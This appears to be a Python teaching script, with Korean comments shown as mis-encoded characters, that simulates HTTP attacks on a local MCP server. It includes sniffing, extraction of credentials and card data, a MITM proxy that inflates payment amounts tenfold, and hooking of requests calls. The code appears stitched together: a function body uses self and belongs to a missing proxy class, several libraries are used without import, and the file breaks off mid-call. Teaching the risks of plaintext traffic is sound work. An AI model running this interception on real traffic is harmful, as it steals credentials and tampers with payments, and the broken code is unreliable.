#!/usr/bin/env python3
"""
===========================================
HTTP ë³´ì•ˆ ì·¨ì•½ì  ê³µê²© ì‹œë®¬ë ˆì´ì…˜ (í†µí•© ë²„ì „)
===========================================

ê°•ì˜ ëª©ì :
ì´ íŒŒì¼ì€ ì•”í˜¸í™”ë˜ì§€ ì•Šì€ HTTP í†µì‹ ì˜ 3ê°€ì§€ ì£¼ìš” ë³´ì•ˆ ìœ„í—˜ì„
ì‹¤ì œë¡œ ì‹œì—°í•˜ëŠ” êµìœ¡ìš© ê³µê²© ì‹œë®¬ë ˆì´ì…˜ì…ë‹ˆë‹¤.

ì¤‘ìš”:
ì´ ì½”ë“œëŠ” ì˜¤ì§ êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
ì‹¤ì œ ì‹œìŠ¤í…œì— ëŒ€í•œ ë¬´ë‹¨ ê³µê²©ì€ ë¶ˆë²•ì´ë©°,
ì»´í“¨í„°ë²”ì£„ì²˜ë²Œë²• ìœ„ë°˜ìœ¼ë¡œ ì²˜ë²Œë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤!

í•™ìŠµ í¬ì¸íŠ¸:
1. ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ê³µê²©
   - HTTP íŠ¸ë˜í”½ì—ì„œ ë¯¼ê°í•œ ë°ì´í„° ë…¸ì¶œ ì‹œì—°
   - í‰ë¬¸ ì „ì†¡ì˜ ìœ„í—˜ì„± ì´í•´
   - íŒ¨í‚· ìº¡ì²˜ ë„êµ¬ ì‚¬ìš©ë²•

2. ì¤‘ê°„ì ê³µê²© (MITM - Man In The Middle)
   - íŠ¸ë˜í”½ ê°€ë¡œì±„ê¸° ë° ë¶„ì„
   - ë°ì´í„° ë³€ì¡° ë° ì£¼ì…
   - í†µì‹  ì œì–´ê¶Œ íƒˆì·¨

3. ë¬´ë‹¨ ì ‘ê·¼ ê³µê²©
   - ì¸ì¦ ì—†ëŠ” HTTP MCP ì„œë²„ ê³µê²©
   - ì•…ì˜ì  ì…ë ¥ ë° ë¦¬ì†ŒìŠ¤ ë‚¨ìš©
   - ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²© ê°€ëŠ¥ì„±

ì‹œì—°í•  ê³µê²©ë“¤:
1. ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘
   - login() í˜¸ì¶œì—ì„œ ë¹„ë°€ë²ˆí˜¸ íƒˆì·¨
   - get_api_key() í˜¸ì¶œì—ì„œ API í‚¤ íƒˆì·¨
   - process_payment() í˜¸ì¶œì—ì„œ ì‹ ìš©ì¹´ë“œ ì •ë³´ íƒˆì·¨

2. MITM ê³µê²©
   - í”„ë¡ì‹œ ì„œë²„ë¡œ íŠ¸ë˜í”½ ì¤‘ê³„
   - ê²°ì œ ê¸ˆì•¡ ë³€ì¡° (10ë°° ì¦ê°€)
   - ìš”ì²­/ì‘ë‹µ ì‹¤ì‹œê°„ ë¶„ì„

3. ë¬´ë‹¨ ì ‘ê·¼
   - ë„êµ¬ ëª©ë¡ íšë“
   - ëŒ€ìš©ëŸ‰ ê³„ì‚°ìœ¼ë¡œ CPU ë‚¨ìš©
   - XSS/SQLi ê³µê²© ì‹œë„

ì‹¤í–‰ ì „ ì¤€ë¹„:
1. http_server.pyê°€ ì‹¤í–‰ ì¤‘ì´ì–´ì•¼ í•¨:
   python3 http_server.py

2. ì„ íƒì‚¬í•­: tcpdumpë¡œ ì‹¤ì œ íŠ¸ë˜í”½ ìº¡ì²˜
   sudo tcpdump -i lo -A -s 0 'tcp port 8000'

ë¹„êµ:
- test_http_server_proxy.py: ì •ìƒ ì‚¬ìš©ì ë™ì‘
- attack_simulation.py: ì•…ì˜ì  ê³µê²©ì ë™ì‘ (ì´ íŒŒì¼)
- ë‘˜ ë‹¤ ê°™ì€ HTTP íŠ¸ë˜í”½ì„ ìƒì„±í•˜ì§€ë§Œ ì˜ë„ê°€ ë‹¤ë¦„!
"""

# ===========================================
# í•„ìš”í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì„í¬íŠ¸
# ===========================================

import asyncio     # ë¹„ë™ê¸° í”„ë¡œê·¸ë˜ë°
import json         # JSON ë°ì´í„° ì²˜ë¦¬
from datetime import datetime  # íƒ€ì„ìŠ¤íƒ¬í”„
import socket       # ì†Œì¼“ í”„ë¡œê·¸ë˜ë° (ì„œë²„ ìƒíƒœ í™•ì¸ìš©)
from fastmcp import Client  # FastMCP í´ë¼ì´ì–¸íŠ¸

# ===========================================
# NetworkSniffer í´ë˜ìŠ¤: ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œë®¬ë ˆì´í„°
# ===========================================

class NetworkSniffer:
    """
    ë„¤íŠ¸ì›Œí¬ íŠ¸ë˜í”½ì„ ìº¡ì²˜í•˜ê³  ë¶„ì„í•˜ëŠ” ì‹œë®¬ë ˆì´í„°

    ì‹¤ì œ ê³µê²© ë„êµ¬:
    - Wireshark: GUI ê¸°ë°˜ íŒ¨í‚· ë¶„ì„
    - tcpdump: CLI ê¸°ë°˜ íŒ¨í‚· ìº¡ì²˜
    - tshark: Wiresharkì˜ CLI ë²„ì „
    - Ettercap: MITM ê³µê²© ë° ìŠ¤ë‹ˆí•‘

    ì´ í´ë˜ìŠ¤ê°€ ì‹œë®¬ë ˆì´ì…˜í•˜ëŠ” ê²ƒ:
    - ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì—ì„œ íŒ¨í‚· ìº¡ì²˜
    - HTTP ìš”ì²­/ì‘ë‹µ ë¶„ì„
    - ë¯¼ê°í•œ ë°ì´í„° ì¶”ì¶œ
    - ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§

    ì‹¤ì œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:
    1. ê³µê²©ìê°€ ê³µê°œ WiFiì—ì„œ tcpdump ì‹¤í–‰
    2. í”¼í•´ìê°€ HTTP ì‚¬ì´íŠ¸ì— ë¡œê·¸ì¸
    3. ë¹„ë°€ë²ˆí˜¸ê°€ í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë¨
    4. ê³µê²©ìê°€ íŒ¨í‚·ì„ ìº¡ì²˜í•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ íšë“

    ë°©ì–´ ë°©ë²•:
    - HTTPS/TLS ì‚¬ìš©ìœ¼ë¡œ ëª¨ë“  ë°ì´í„° ì•”í˜¸í™”
    - VPN ì‚¬ìš©ìœ¼ë¡œ ì „ì²´ íŠ¸ë˜í”½ í„°ë„ë§
    - ê³µê°œ WiFi ì‚¬ìš© ì‹œ ì£¼ì˜
    """

    def __init__(self):
        """
        ìŠ¤ë‹ˆí¼ ì´ˆê¸°í™”

        ì‹¤ì œ ë„êµ¬ì—ì„œëŠ”:
        - ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ ì„ íƒ (eth0, wlan0 ë“±)
        - í”„ë¡œë¯¸ìŠ¤íì–´ìŠ¤ ëª¨ë“œ í™œì„±í™”
        - íŒ¨í‚· í•„í„° ì„¤ì • (BPF - Berkeley Packet Filter)
        """
        self.captured_data = []  # ìº¡ì²˜ëœ íŒ¨í‚· ì €ì¥
        self.sniffing = False     # ìŠ¤ë‹ˆí•‘ í™œì„±í™” ì—¬ë¶€

    def start_sniffing(self):
        """
        ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œì‘

        ì‹¤ì œ ê³µê²©ì—ì„œëŠ”:
        tcpdump -i wlan0 -A -s 0 'tcp port 80 or tcp port 8000'

        -i wlan0: ë¬´ì„  ì¸í„°í˜ì´ìŠ¤ ì„ íƒ
        -A: ASCIIë¡œ íŒ¨í‚· ë‚´ìš© ì¶œë ¥
        -s 0: ì „ì²´ íŒ¨í‚· ìº¡ì²˜ (ì˜ë¦¬ì§€ ì•ŠìŒ)
        'tcp port 80': HTTP íŠ¸ë˜í”½ë§Œ í•„í„°ë§
        """
        self.sniffing = True
        print("\nğŸ” ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì‹œì‘...")

    def stop_sniffing(self):
        """
        ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì¤‘ì§€

        ì‹¤ì œ ë„êµ¬ì—ì„œëŠ”:
        - Ctrl+Cë¡œ ìº¡ì²˜ ì¤‘ì§€
        - ìº¡ì²˜ëœ íŒ¨í‚·ì„ íŒŒì¼ë¡œ ì €ì¥
        - í†µê³„ ì •ë³´ ì¶œë ¥
        """
        self.sniffing = False
        print("\nğŸ›‘ ë„¤íŠ¸ì›Œí¬ ìŠ¤ë‹ˆí•‘ ì¤‘ì§€")

    def intercept_http_request(self, method, url, headers, data):
        """
        HTTP ìš”ì²­ ê°€ë¡œì±„ê¸° ì‹œë®¬ë ˆì´ì…˜

        ì‹¤ì œ ê³µê²©ì—ì„œëŠ”:
        1. ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ë¥¼ í”„ë¡œë¯¸ìŠ¤íì–´ìŠ¤ ëª¨ë“œë¡œ ì„¤ì •
           (ëª¨ë“  íŒ¨í‚·ì„ ìº¡ì²˜, ìì‹ ì—ê²Œ ì˜¨ ê²ƒë§Œì´ ì•„ë‹Œ)
        2. TCP íŒ¨í‚·ì„ ìº¡ì²˜
        3. HTTP í”„ë¡œí† ì½œ íŒŒì‹±
        4. ìš”ì²­ ë³¸ë¬¸(body) ì¶”ì¶œ

        ê³µê²© ê°€ëŠ¥í•œ í™˜ê²½:
        - ê³µê°œ WiFi (ì¹´í˜, ê³µí•­, í˜¸í…”)
        - ê°™ì€ ë„¤íŠ¸ì›Œí¬ì˜ ë‹¤ë¥¸ ì»´í“¨í„°
        - ë¼ìš°í„°/ìŠ¤ìœ„ì¹˜ì— ì ‘ê·¼ ê°€ëŠ¥í•œ ê²½ìš°
        - ARP ìŠ¤í‘¸í•‘ìœ¼ë¡œ íŠ¸ë˜í”½ ë¦¬ë‹¤ì´ë ‰íŠ¸

        íŒŒë¼ë¯¸í„°:
        - method: HTTP ë©”ì„œë“œ (GET, POST ë“±)
        - url: ìš”ì²­ URL
        - headers: HTTP í—¤ë”ë“¤
        - data: ìš”ì²­ ë³¸ë¬¸ (ë¯¼ê°í•œ ë°ì´í„° í¬í•¨)
        """
        if not self.sniffing:
            return

        # íƒ€ì„ìŠ¤íƒ¬í”„ ê¸°ë¡ (í¬ë Œì‹ ë¶„ì„ìš©)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ìº¡ì²˜ëœ ë°ì´í„° êµ¬ì¡°í™”
        # ì‹¤ì œ íŒ¨í‚· ìº¡ì²˜ì—ì„œëŠ” í›¨ì”¬ ë” ë§ì€ ì •ë³´ í¬í•¨:
        # - IP ì£¼ì†Œ (ì¶œë°œì§€/ëª©ì ì§€)
        # - MAC ì£¼ì†Œ
        # - TCP ì‹œí€€ìŠ¤ ë²ˆí˜¸
        # - ì „ì²´ HTTP í—¤ë”
        intercepted = {
            "timestamp": timestamp,
            "method": method,
            "url": url,
            "headers": headers,
            "data": data
        }

        self.captured_data.append(intercepted)

        # ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§ ì¶œë ¥
        print(f"\nğŸ“¡ [INTERCEPTED] {timestamp}")
        print(f"   Method: {method}")
        print(f"   URL: {url}")

        # ===========================================
        # ë¯¼ê°í•œ ë°ì´í„° í•˜ì´ë¼ì´íŠ¸
        # ===========================================
        # ê³µê²©ìëŠ” íŠ¹ì • í‚¤ì›Œë“œë¥¼ ê²€ìƒ‰í•˜ì—¬ ë¯¼ê°í•œ ì •ë³´ ì¶”ì¶œ
        # grep íŒ¨í„´: password|api|key|card|cvv|ssn|token

        if data:
            print("   ğŸš¨ í‰ë¬¸ ë°ì´í„° ìº¡ì²˜:")
            if isinstance(data, dict):
                for key, value in data.items():
                    # ë¯¼ê°í•œ í‚¤ì›Œë“œ íƒì§€
                    # ì‹¤ì œ ê³µê²©ì—ì„œëŠ” ì •ê·œí‘œí˜„ì‹ ì‚¬ìš©:
                    # - ì‹ ìš©ì¹´ë“œ: \d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}
                    # - ì´ë©”ì¼: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
                    # - API í‚¤: sk-[a-zA-Z0-9]{48}
                    if any(sensitive in str(key).lower() for sensitive in ['password', 'card', 'cvv', 'api']):
                        print(f"      âš ï¸  {key}: {value}")
                    else:
                        print(f"      {key}: {value}")
            else:
                print(f"      {data}")
                
    def analyze_captured_data(self):
        """
        ìº¡ì²˜ëœ ë°ì´í„° ë¶„ì„ ë° ë¯¼ê°í•œ ì •ë³´ ì¶”ì¶œ

        ì‹¤ì œ ê³µê²©ì—ì„œì˜ ë¶„ì„ ê³¼ì •:
        1. íŒ¨í‚· í•„í„°ë§: HTTP íŠ¸ë˜í”½ë§Œ ì„ íƒ
        2. í”„ë¡œí† ì½œ íŒŒì‹±: HTTP í—¤ë”ì™€ ë³¸ë¬¸ ë¶„ë¦¬
        3. íŒ¨í„´ ë§¤ì¹­: ì •ê·œí‘œí˜„ì‹ìœ¼ë¡œ ë¯¼ê°í•œ ë°ì´í„° íƒì§€
        4. ë°ì´í„° ì¶”ì¶œ: êµ¬ì¡°í™”ëœ í˜•íƒœë¡œ ì €ì¥
        5. ë³´ê³ ì„œ ìƒì„±: ê³µê²©ìê°€ í™œìš© ê°€ëŠ¥í•œ í˜•íƒœë¡œ ì •ë¦¬

        ë¶„ì„ ë„êµ¬:
        - Wiresharkì˜ ë¶„ì„ ê¸°ëŠ¥
        - Python ìŠ¤í¬ë¦½íŠ¸ (scapy, dpkt)
        - grep, awk, sed (í…ìŠ¤íŠ¸ ì²˜ë¦¬)
        """
        print("\n\nğŸ“Š ìº¡ì²˜ëœ ë¯¼ê°í•œ ë°ì´í„° ë¶„ì„")
        print("=" * 60)

        # ë¯¼ê°í•œ ë°ì´í„° ë¶„ë¥˜
        # ì‹¤ì œ ê³µê²©ì—ì„œëŠ” ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥í•˜ì—¬ ë‚˜ì¤‘ì— í™œìš©
        passwords = []      # ë¡œê·¸ì¸ ì •ë³´
        api_keys = []       # API í‚¤ (í˜„ì¬ ë¯¸ì‚¬ìš©, í™•ì¥ ê°€ëŠ¥)
        card_numbers = []   # ì‹ ìš©ì¹´ë“œ ì •ë³´

        # ìº¡ì²˜ëœ ëª¨ë“  íŒ¨í‚· ìˆœíšŒ
        for packet in self.captured_data:
            data = packet.get("data", {})
            if isinstance(data, dict):
                # MCP JSON-RPC ìš”ì²­ì—ì„œ íŒŒë¼ë¯¸í„° ì¶”ì¶œ
                # êµ¬ì¡°: {"jsonrpc": "2.0", "method": "tools/call",
                #        "params": {"name": "tool_name", "arguments": {...}}}
                params = data.get("params", {})
                if isinstance(params, dict):
                    tool_name = params.get("name", "")
                    arguments = params.get("arguments", {})

                    # ===========================================
                    # ë¡œê·¸ì¸ ì •ë³´ ì¶”ì¶œ
                    # ===========================================
                    if tool_name == "login" and isinstance(arguments, dict):
                        # login() ë„êµ¬ í˜¸ì¶œì—ì„œ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ
                        # ì‹¤ì œ ì„œë¹„ìŠ¤: ì€í–‰, ì´ë©”ì¼, SNS ë“±
                        passwords.append({
                            "time": packet["timestamp"],
                            "username": arguments.get("username", "unknown"),
                            "password": arguments.get("password", "unknown")
                        })

                    # ===========================================
                    # API í‚¤ ìš”ì²­ ì¶”ì¶œ
                    # ===========================================
                    elif tool_name == "get_api_key" and isinstance(arguments, dict):
                        # get_api_key() ë„êµ¬ í˜¸ì¶œì—ì„œ ì¸ì¦ ì •ë³´ ì¶”ì¶œ
                        # API í‚¤ëŠ” ì‘ë‹µì— ìˆì§€ë§Œ, ì¸ì¦ ì •ë³´ë„ ë¯¼ê°í•¨
                        passwords.append({
                            "time": packet["timestamp"],
                            "username": arguments.get("username", "unknown"),
                            "password": arguments.get("password", "unknown")
                        })

                    # ===========================================
                    # ì‹ ìš©ì¹´ë“œ ì •ë³´ ì¶”ì¶œ
                    # ===========================================
                    elif tool_name == "process_payment" and isinstance(arguments, dict):
                        # process_payment() ë„êµ¬ í˜¸ì¶œì—ì„œ ì¹´ë“œ ì •ë³´ ì¶”ì¶œ
                        # ì‹¤ì œ: ì˜¨ë¼ì¸ ì‡¼í•‘, ê²°ì œ API ë“±
                        card_numbers.append({
                            "time": packet["timestamp"],
                            "card": arguments.get("card_number", "unknown"),
                            "cvv": arguments.get("cvv", "unknown"),
                            "amount": arguments.get("amount", "unknown")
                        })

        # ===========================================
        # ì¶”ì¶œëœ ë¯¼ê°í•œ ë°ì´í„° ì¶œë ¥
        # ===========================================

        if passwords:
            print("\nğŸ”“ ë…¸ì¶œëœ ë¡œê·¸ì¸ ì •ë³´:")
            for p in passwords:
                print(f"   ì‹œê°„: {p['time']}")
                print(f"   ì‚¬ìš©ì: {p['username']}")
                print(f"   ë¹„ë°€ë²ˆí˜¸: {p['password']}")
                print()
                # ì‹¤ì œ ê³µê²©ì—ì„œëŠ”:
                # - ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥
                # - ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì—ì„œ ê°™ì€ ë¹„ë°€ë²ˆí˜¸ ì¬ì‚¬ìš© ì‹œë„
                # - í”¼ì‹± ê³µê²©ì— í™œìš©

        if card_numbers:
            print("\nğŸ’³ ë…¸ì¶œëœ ì‹ ìš©ì¹´ë“œ ì •ë³´:")
            for c in card_numbers:
                print(f"   ì‹œê°„: {c['time']}")
                print(f"   ì¹´ë“œë²ˆí˜¸: {c['card']}")
                print(f"   CVV: {c['cvv']}")
                print(f"   ê¸ˆì•¡: ${c['amount']}")
                print()
                # ì‹¤ì œ ê³µê²©ì—ì„œëŠ”:
                # - ë‹¤í¬ì›¹ì— íŒë§¤
                # - ì§ì ‘ ì‚¬ìš©í•˜ì—¬ ë¬¼í’ˆ êµ¬ë§¤
                # - í”¼ì‹± ì‚¬ì´íŠ¸ ì œì‘ì— í™œìš©

        # í†µê³„ ì •ë³´
        print(f"\nğŸ“ˆ ì´ ìº¡ì²˜ëœ íŒ¨í‚·: {len(self.captured_data)}")
        print(f"   - ë¡œê·¸ì¸ ì‹œë„: {len(passwords)}")
        print(f"   - ê²°ì œ ì •ë³´: {len(card_numbers)}")

# ===========================================
# ê¸€ë¡œë²Œ ìŠ¤ë‹ˆí¼ ì¸ìŠ¤í„´ìŠ¤
# ===========================================
sniffer = NetworkSniffer()

# ===========================================
# ì‚¬ìš©ì íŠ¸ë˜í”½ ì‹œë®¬ë ˆì´ì…˜
# ===========================================

async def simulate_user_traffic(base_url="http://127.0.0.1:8000/mcp"):
        """
        MITM í”„ë¡ì‹œ ì´ˆê¸°í™”

        íŒŒë¼ë¯¸í„°:
        - target_host: ì‹¤ì œ ì„œë²„ ì£¼ì†Œ (í”¼í•´ìê°€ ì ‘ì†í•˜ë ¤ëŠ” ì„œë²„)
        - target_port: ì‹¤ì œ ì„œë²„ í¬íŠ¸ (8000 = http_server.py)
        - proxy_port: í”„ë¡ì‹œ í¬íŠ¸ (8888 = ê³µê²©ìì˜ í”„ë¡ì‹œ)

        ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:
        1. í”¼í•´ì: "http://example.comì— ì ‘ì†í•˜ê³  ì‹¶ì–´"
        2. ê³µê²©ì: DNS ìŠ¤í‘¸í•‘ìœ¼ë¡œ example.com -> 127.0.0.1:8888
        3. í”¼í•´ì: 127.0.0.1:8888ì— ì—°ê²° (í”„ë¡ì‹œì— ì—°ê²°ë¨)
        4. í”„ë¡ì‹œ: ì‹¤ì œ ì„œë²„(127.0.0.1:8000)ì— ì¤‘ê³„
        5. í”¼í•´ìëŠ” ì •ìƒ ë™ì‘í•œë‹¤ê³  ì°©ê°
        """
        self.target_host = target_host        # ì‹¤ì œ ì„œë²„ ì£¼ì†Œ
        self.target_port = target_port        # ì‹¤ì œ ì„œë²„ í¬íŠ¸
        self.proxy_port = proxy_port          # í”„ë¡ì‹œ í¬íŠ¸
        self.intercepted_requests = []        # ê°€ë¡œì±ˆ ìš”ì²­ë“¤
        self.intercepted_responses = []       # ê°€ë¡œì±ˆ ì‘ë‹µë“¤
        self.modified_count = 0               # ë³€ì¡°í•œ ìš”ì²­ ìˆ˜

    async def intercept_and_modify(self, request):
        """ìš”ì²­ì„ ê°€ë¡œì±„ê³  ìˆ˜ì •"""
        # ì›ë³¸ ìš”ì²­ ë³¸ë¬¸ ì½ê¸°
        body = await request.read()
        
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}
            
        # ìš”ì²­ ë¡œê¹…
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.intercepted_requests.append({
            "timestamp": timestamp,
            "method": request.method,
            "path": request.path,
            "headers": dict(request.headers),
            "data": data
        })
        
        print(f"\nğŸ¯ [{timestamp}] ìš”ì²­ ê°€ë¡œì±„ê¸°")
        print(f"   ê²½ë¡œ: {request.path}")
        
        # ë¯¼ê°í•œ ë°ì´í„° íƒì§€ ë° ìˆ˜ì •
        modified = False
        
        if isinstance(data, dict):
            # ë¡œê·¸ì¸ ì‹œë„ ê°€ë¡œì±„ê¸°
            if data.get("params", {}).get("name") == "login":
                original_password = data["params"]["arguments"].get("password", "")
                print(f"   ğŸ”“ ë¡œê·¸ì¸ ì‹œë„ íƒì§€!")
                print(f"      ì‚¬ìš©ì: {data['params']['arguments'].get('username', '')}")
                print(f"      ë¹„ë°€ë²ˆí˜¸: {original_password}")
                
            # API í‚¤ ìš”ì²­ ê°€ë¡œì±„ê¸°
            elif data.get("params", {}).get("name") == "get_api_key":
                print(f"   ğŸ”‘ API í‚¤ ìš”ì²­ íƒì§€!")
                print(f"      ì‚¬ìš©ì: {data['params']['arguments'].get('username', '')}")
                
            # ê²°ì œ ì •ë³´ ê°€ë¡œì±„ê¸°
            elif data.get("params", {}).get("name") == "process_payment":
                args = data["params"]["arguments"]
                print(f"   ğŸ’³ ê²°ì œ ì •ë³´ íƒì§€!")
                print(f"      ì¹´ë“œë²ˆí˜¸: {args.get('card_number', '')}")
                print(f"      CVV: {args.get('cvv', '')}")
                print(f"      ê¸ˆì•¡: ${args.get('amount', '')}")
                
                # ê¸ˆì•¡ ë³€ì¡° (ë°ëª¨ìš©)
                original_amount = args.get('amount', 0)
                args['amount'] = original_amount * 10  # 10ë°°ë¡œ ì¦ê°€
                modified = True
                print(f"      âš ï¸  ê¸ˆì•¡ ë³€ì¡°: ${original_amount} â†’ ${args['amount']}")
                self.modified_count += 1
        
        # ëŒ€ìƒ ì„œë²„ë¡œ ìš”ì²­ ì „ë‹¬
        target_url = f"http://{self.target_host}:{self.target_port}{request.path}"

        try:
            # FastMCP ì„œë²„ê°€ ìš”êµ¬í•˜ëŠ” í—¤ë” ì„¤ì •
            forward_headers = {k: v for k, v in request.headers.items() if k.lower() != 'host'}
            forward_headers['Accept'] = 'application/json, text/event-stream'

            # Timeout ì„¤ì • (10ì´ˆ)
            timeout = aiohttp.ClientTimeout(total=10)

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.request(
                    method=request.method,
                    url=target_url,
                    headers=forward_headers,
                    data=json.dumps(data) if data else None,
                    ssl=False
                ) as resp:
                    response_body = await resp.read()
                    response_headers = dict(resp.headers)
                    status = resp.status
        except Exception as e:
            # ì—°ê²° ì‹¤íŒ¨ ì‹œ ê¸°ë³¸ ì‘ë‹µ
            print(f"   âŒ ëŒ€ìƒ ì„œë²„ ì—°ê²° ì‹¤íŒ¨: {e}")
            response_body = json.dumps({
                "jsonrpc": "2.0",
                "error": {"code": -1, "message": "Server not available"},
                "id": data.get("id", 1)
            }).encode()
            response_headers = {"Content-Type": "application/json"}
            status = 503
        
        # ì‘ë‹µ ê°€ë¡œì±„ê¸°
        try:
            response_data = json.loads(response_body) if response_body else {}
        except:
            response_data = {}
            
        self.intercepted_responses.append({
            "timestamp": timestamp,
            "status": status,
            "data": response_data
        })
        
        # ì‘ë‹µ ë°˜í™˜
        return web.Response(
            body=response_body,
            status=status,
            headers=response_headers
        )
    
    async def handle_all(self, request):
        """ëª¨ë“  ìš”ì²­ ì²˜ë¦¬"""
        return await self.intercept_and_modify(request)
    
    async def start_proxy(self):
        """í”„ë¡ì‹œ ì„œë²„ ì‹œì‘"""
        app = web.Application()
        app.router.add_route('*', '/{path:.*}', self.handle_all)
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '127.0.0.1', self.proxy_port)
        
        print(f"ğŸ•µï¸ MITM í”„ë¡ì‹œ ì„œë²„ ì‹œì‘: http://127.0.0.1:{self.proxy_port}")
        print(f"   íƒ€ê²Ÿ ì„œë²„: http://{self.target_host}:{self.target_port}")
        
        await site.start()
        return runner

    def show_attack_summary(self):
        """ê³µê²© ìš”ì•½ í‘œì‹œ"""
        print("\n\nğŸ“Š MITM ê³µê²© ìš”ì•½")
        print("=" * 60)
        
        print(f"\nğŸ¯ ê°€ë¡œì±ˆ ìš”ì²­: {len(self.intercepted_requests)}ê°œ")
        for req in self.intercepted_requests:
            print(f"   - {req['timestamp']}: {req['path']}")
            
        print(f"\nğŸ£ ê°€ë¡œì±ˆ ì‘ë‹µ: {len(self.intercepted_responses)}ê°œ")
        
        print(f"\nâš ï¸  ë³€ì¡°ëœ ìš”ì²­: {self.modified_count}ê°œ")
        
        # ìˆ˜ì§‘ëœ ë¯¼ê°í•œ ì •ë³´ í‘œì‹œ
        print("\nğŸ”“ ìˆ˜ì§‘ëœ ë¯¼ê°í•œ ì •ë³´:")
        
        credentials = []
        cards = []
        
        for req in self.intercepted_requests:
            data = req.get("data", {})
            if isinstance(data, dict) and "params" in data:
                params = data["params"]
                
                if params.get("name") == "login":
                    args = params.get("arguments", {})
                    credentials.append({
                        "username": args.get("username"),
                        "password": args.get("password")
                    })
                
                elif params.get("name") == "get_api_key":
                    args = params.get("arguments", {})
                    credentials.append({
                        "username": args.get("username"),
                        "password": args.get("password")
                    })
                    
                elif params.get("name") == "process_payment":
                    args = params.get("arguments", {})
                    cards.append({
                        "card": args.get("card_number"),
                        "cvv": args.get("cvv"),
                        "amount": args.get("amount")
                    })
        
        if credentials:
            print("\n   ë¡œê·¸ì¸ ì •ë³´:")
            for cred in credentials:
                print(f"      - {cred['username']}: {cred['password']}")
                
        if cards:
            print("\n   ì‹ ìš©ì¹´ë“œ ì •ë³´:")
            for card in cards:
                print(f"      - ì¹´ë“œ: {card['card']}")
                print(f"        CVV: {card['cvv']}")
                print(f"        ê¸ˆì•¡: ${card['amount']}")

# ê¸€ë¡œë²Œ ìŠ¤ë‹ˆí¼ ì¸ìŠ¤í„´ìŠ¤
sniffer = NetworkSniffer()

# ì›ë³¸ requests í•¨ìˆ˜ë“¤ì„ ì €ì¥
original_request = requests.request
original_post = requests.post

# requests ë¼ì´ë¸ŒëŸ¬ë¦¬ í›„í‚¹
def hooked_request(method, url, **kwargs):
    """requests.request í•¨ìˆ˜ í›„í‚¹"""
    # ìš”ì²­ ë°ì´í„° ê°€ë¡œì±„ê¸°
    data = kwargs.get('json', kwargs.get('data', {}))
    headers = kwargs.get('headers', {})

    sniffer.intercept_http_request(method, url, headers, data)

    # ì›ë³¸ í•¨ìˆ˜ í˜¸ì¶œ (í—¤ë” í¬í•¨)
    return original_request(method, url, **kwargs)

def hooked_post(url, **kwargs):
    """requests.post í•¨ìˆ˜ í›„í‚¹"""
    return hooked_request('POST', url, **kwargs)

# í›„í‚¹ ì ìš©
requests.request = hooked_request
requests.post = hooked_post

async def simulate_user_traffic(base_url="http://127.0.0.1:8000/mcp"):
    """ì‚¬ìš©ì íŠ¸ë˜í”½ ì‹œë®¬ë ˆì´ì…˜ - FastMCP Client ì‚¬ìš©"""
    print("\nğŸ‘¤ ì‚¬ìš©ì í™œë™ ì‹œë®¬ë ˆì´ì…˜...")

    client = Client(base_url)

    try:
        async with client:
            # 1. ë¡œê·¸ì¸ ì‹œë„
            print("\n1ï¸âƒ£ ì‚¬ìš©ì ë¡œê·¸ì¸...")
            sniffer.intercept_http_request(
                "POST", base_url,
                {"Content-Type": "application/json"},
                {
                    "params": {
                        "name": "login",
                        "arguments": {"username": "admin", "password": "admin123"}
                    }
                }
            )

            try:
                result = await client.call_tool("login", {
                    "username": "admin",
                    "password": "admin123"
                })
                print(f"   ğŸ“¡ ìš”ì²­ ì „ì†¡ë¨ (ì„±ê³µ)")
                print("   âœ… ë¡œê·¸ì¸ ì„±ê³µ!")
                print(f"   ì‘ë‹µ: {str(result)[:100]}...")
                print("   âš ï¸  ë¯¼ê°í•œ ë¡œê·¸ì¸ ì •ë³´ê°€ í‰ë¬¸ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤!")
            except Exception as e:
                print(f"   ğŸ“¡ ìš”ì²­ ì‹œë„ë¨ (ì˜¤ë¥˜: {type(e).__name__})")
                print("   âš ï¸  ë¯¼ê°í•œ ë¡œê·¸ì¸ ì •ë³´ê°€ í‰ë¬¸ìœ¼ë¡œ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì—ˆìŠµë‹ˆë‹¤!")

            await asyncio.sleep(1)

            # 2. API í‚¤ ì¡°íšŒ
            print("\n2ï¸âƒ£ API í‚¤ ì¡°íšŒ...")
            sniffer.intercept_http_request(
                "POST", base_url,
                {"Content-Type": "application/json"},
                {
                    "params": {
